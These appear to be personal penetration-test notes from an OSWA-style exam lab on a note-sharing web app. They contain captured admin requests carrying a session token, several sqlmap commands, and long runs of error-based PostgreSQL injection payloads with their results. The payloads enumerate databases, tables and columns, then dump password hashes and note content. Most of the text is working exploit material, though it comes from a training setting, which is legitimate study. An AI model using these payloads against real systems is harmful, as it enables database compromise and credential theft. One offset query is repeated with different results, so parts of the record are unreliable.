# Start here
starting page after logging in with `administrator:adminxss`
- able to `delete` or `approve` notes
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic26.png]]
also able to `lock` or look at notes of `users`
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic27.png]]
## Deleting Users
burp request of deleting users
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic28.png]]
post request for `sql`
```bash
POST /api/admin/note/delete?noteId=e23ff7e1-0925-420c-aa9f-e562f81e63bc HTTP/1.1
Host: 192.168.62.62:8443
Cookie: sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6InRydWUiLCJleHAiOjE3NTgzMjkyOTYsInVzZXJJZCI6IjM5YmNjMDEwLTE5NWEtNGM0Mi1hNmM4LWE2YmRjYjI0NmU5YyIsInVzZXJuYW1lIjoiYWRtaW5pc3RyYXRvciJ9.855q7o-lOgqbTCApebC5kqyXuOluRC5OIDMo5MLZ2uU
Content-Length: 0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.62.62
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Sec-Fetch-Storage-Access: active
Referer: http://192.168.62.62/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive
```
## Approving Users
burp request of approving users
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic29.png]]
## Locking Users
locking out`jen7` user
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic30.png]]
unlocking user 
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic31.png]]

## Viewing Notes
burp of `viewing` notes
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic32.png]]

# SQL Testing
testing all post requests above

don't believe `sqlmap`will work, but can specify db now with is `postgresql`
```bash
sqlmap -r delete_post.txt --batch --risk=3 --level=5
```
got an `sql` error when utilizing `''` two backticks
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-PSQL-identification-pic33.png]]

```bash
'''-SELECT+current_user
```

![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic34.png]]
error i am receiving
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic35.png]]

```bash
{"status": "error", "message":"An error occurred. StatementCallback; bad SQL grammar [DELETE FROM notes WHERE id = '--b079a6c0-fcd2-43b1-8feb-2147fac1eb0e'''-SELECT current_user';]; nested exception is org.postgresql.util.PSQLException: Unterminated string literal started at position 91 in SQL DELETE FROM notes WHERE id = '--b079a6c0-fcd2-43b1-8feb-2147fac1eb0e'''-SELECT current_user';. Expected  char"}
```
`sqlmap` stuff
```
1.
sqlmap -r delete.req -p id --batch --level=5 --risk=3 --technique=BEUSTQ --dbs

-r delete.req: Load raw request

-p id: Target the id field

--level=5 --risk=3: High-depth testing

--technique=BEUSTQ: Use all SQLi types (Boolean, Error, Union, Stacked, Time-based, Inline queries)

--dbs: Extract DB names


2.sqlmap -r delete.req -p id --prefix="'" --suffix="--" --dbs
--prefix and --suffix help when the backend wraps the id in single quotes.

```
## Manual Injection Testing 
first working query, this is really annoying because i need to get a new `uuid` note request to continue enumerating the database
- also must `url encode` to work

### Listing Databases
the goal is to map out the database and hopefully be able to dump from it
```bash
'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) AS integer))--
'; (SELECT CAST(SUBSTRING(version() FROM 'PostgreSQL ([0-9]+)\.') AS INTEGER);--
database: postgres
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic36.png]]
```bash
'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--

database: lophostrix
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic37.png]]
```bash
'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 2) AS integer))--

database: template1
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic38.png]]
```bash
'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 3) AS integer))--

database: template0
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic39.png]]
### Listing Tables
```bash
'; (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 0) AS integer))--

table: users
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic40.png]]
```bash
'; (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--

table: notes
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic41.png]]
```bash
'; (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 2) AS integer))--

table: likes
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic42.png]]

### Listing Columns in users table
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 0) AS integer))--

column in users table: id
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic43.png]]
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 1) AS integer))--

column in users table: isadmin
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic44.png]]
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 2) AS integer))--

column in users table: islocked
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic45.png]]
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 3) AS integer))--

column in users table: username
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic46.png]]
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 4) AS integer))--

column in users table: password
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic47.png]]


### Listing passwords from users table
```bash
'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 0) AS INTEGER); --

password from users table: e84edOziE/Knw2SKbNoyY5PGseegEfUGTyPxSpzuD3k=
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic48.png]]
```bash
'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 1) AS INTEGER); --

password from users table: qX+gUfRZNLo+5vfTQXNWyzKrhae7K+QQUavIQ0t1gP4=
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic49.png]]
```bash
'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 2) AS INTEGER); -- 

password from users table: aJOPMM2Yc/wmVgpqWROHVVxR+5tAaH+8/bdPkIyAOe0=
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic50.png]]
```bash
'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 3) AS INTEGER); -- 

password from users table: *****
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic51.png]]
```bash
'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 4) AS INTEGER); -- 

password from users table: *****
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic52.png]]
```bash
'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 5) AS INTEGER); -- 

password from users table: *****
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic53.png]]
```bash
'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 6) AS INTEGER); -- 

password from users table: *****
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic54.png]]
```bash
'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 6) AS INTEGER); -- 

password from users table: YDA64iuZiGG847KPM+7BvnWKITyGyTwHbb6fVYwRx1I=
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic55.png]]

### Listing Columns in notes table
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 0) AS integer))--

column in notes table: id
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic56.png]]
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 1) AS integer))--

column in notes table: owner_id
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic57.png]]
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 2) AS integer))--

column in notes table: public
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic58.png]]
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 3) AS integer))--

column in notes table: needsreview
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic59.png]]
```bash
'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 4) AS integer))--

column in notes table: content
```
![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic60.png]]

### Listing content from notes table

```bash
'; SELECT 1 / CAST((SELECT content FROM notes LIMIT 1 OFFSET 0) AS INTEGER); --

content from notes table: e84edOziE/Knw2SKbNoyY5PGseegEfUGTyPxSpzuD3k=
```